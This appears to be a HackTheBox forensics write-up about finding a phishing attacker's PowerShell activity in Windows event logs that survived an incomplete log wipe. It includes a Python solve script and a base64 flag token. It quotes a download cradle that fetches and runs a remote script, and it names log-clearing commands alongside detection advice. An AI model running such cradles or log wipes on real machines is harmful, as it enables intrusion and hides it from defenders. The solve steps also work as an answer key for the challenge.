---
title: "Event Horizon"
date: 2027-04-18 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, evtx, powershell, event-logs, dfir, log-clearing]
description: "An Easy Forensics challenge: a CEO's box was phished and the attacker cleared the PowerShell logs to cover their tracks — but only the classic 'Windows PowerShell' log, not the 'Microsoft-Windows-PowerShell/Operational' channel. That surviving channel logged the full download cradle, and the malicious gist's .ps1 filename turns out to be the flag in base64."
---

## Overview

Event Horizon is an Easy HackTheBox **Forensics** challenge. You're handed a `Logs/`
folder with 323 Windows `.evtx` files and the story that a CEO's machine was compromised
in a phishing attack. The attacker tried to wipe their PowerShell activity — but cleared
the wrong log. The surviving channel hands you the whole attack command, and the malicious
download URL's filename *is* the flag, base64-encoded.

## The technique

Windows logs PowerShell activity in **two separate channels**:

- the classic **`Windows PowerShell`** log, and
- **`Microsoft-Windows-PowerShell/Operational`**, which carries script-block logging
  (Event ID **4104**) and engine warnings (Event ID **4100**).

Clearing one does **not** touch the other. Here the attacker cleared
`Windows PowerShell.evtx` and `Microsoft-Windows-Windows Defender/Operational.evtx`, but
left the Operational channel intact. Every PowerShell launch records its full resolved
command line in the **`Host Application`** field of these events — so the entire download
cradle survived in plain text. This is an instance of insufficient/incomplete logging
controls being defeated only partially —
[CWE-778](https://cwe.mitre.org/data/definitions/778.html).

## Solution

First, find the log that actually has data. Almost all 323 files are empty 64 KB stubs,
so filter by size:

```bash
find Logs -name '*.evtx' -size +69632c
```

The standout is `Microsoft-Windows-PowerShell%4Operational.evtx` (5.3 MB, 149 events).

On Kali the `evtx_dump` CLI wrapper was broken (`ModuleNotFoundError: No module named
'scripts'`), so parse the records with the `python-evtx` library directly. The EID 4100
warnings read `ScriptContainedMaliciousContent` — Defender blocked an `Invoke-Mimikatz` —
and each one's `Host Application` field logs the cradle:

```
powershell -ep bypass -c iex(new-object net.webclient).downloadstring(
  'https://gist.githubusercontent.com/hiddenblueteamer/.../SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1')
```

That gist's `.ps1` filename is base64. Decode it:

```bash
echo SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg | base64 -d   # -> HTB{...}
```

The full solve, runnable verbatim:

Create `solve.py`:

```python
from Evtx.Evtx import Evtx
import re, base64

LOG = "files/Logs/Microsoft-Windows-PowerShell%4Operational.evtx"

names = set()
with Evtx(LOG) as log:
    for rec in log.records():
        x = rec.xml()
        for m in re.finditer(r'Host Application = (.*)', x):
            for fn in re.findall(r'/([A-Za-z0-9+=]{8,})\.ps1', m.group(1)):
                names.add(fn)

for fn in names:
    try:
        dec = base64.b64decode(fn + "=" * (-len(fn) % 4)).decode("utf-8").strip()
    except Exception:
        continue
    if dec.startswith("HTB{"):
        print(dec)
```

```bash
python3 solve.py   # prints HTB{...}
```

One gotcha worth calling out: when pulling the base64 token out of the URL, the regex
character class must **exclude `/`** (`[A-Za-z0-9+=]`, not `[A-Za-z0-9+/=]`). Include the
slash and the greedy match swallows the entire URL path up to `.ps1`, and the decode
fails — capture only the trailing filename segment.

## Why it worked

PowerShell records the resolved command line in *both* the classic and the Operational
channels, and clearing one never affects the other. The attacker's anti-forensic step was
incomplete, so the indicator of compromise a responder would pivot on — the gist URL —
carried the secret verbatim.

## Fix / defense

- Forward logs off-host (Windows Event Forwarding → SIEM) so a local `wevtutil cl` /
  `Clear-EventLog` can't erase the evidence.
- Alert on **Event ID 1102** (security log cleared) and **104** (other log cleared).
- Alert on PowerShell download cradles: `downloadstring`, `-ep bypass`,
  `IEX (New-Object Net.WebClient)`.
- Enable and centrally collect script-block logging (4104) — it's the highest-value
  artifact and it survives most cleanup attempts.
